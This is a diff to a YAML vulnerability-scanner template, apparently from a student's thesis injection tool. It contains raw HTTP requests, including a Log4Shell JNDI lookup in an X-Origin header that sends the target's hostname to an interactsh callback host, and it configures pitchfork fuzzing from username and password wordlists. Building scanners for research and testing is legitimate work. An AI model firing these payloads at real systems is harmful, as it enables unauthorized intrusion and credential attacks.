@@ -46,7 +46,7 @@ requests:
         X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
         Content-Type: application/json
 
-        {"result": [{"id": 2, "name": "US", "flag": "sf{{Hostname}}"}]}
+        {"result": [{"id": 2, "name": "US", "flag{{passwords}}": "sf{{Hostname}}"}]}
       - |
          POST /abc/xxx/index.php HTTP/1.1
          Host: {{Hostname}}
@@ -62,6 +62,8 @@ requests:
     payloads:
       users: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
       passwords: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
+#      Hostname: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
+#      Scheme: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
     redirect: true
     thread: 20
     scanMode: pitchfork
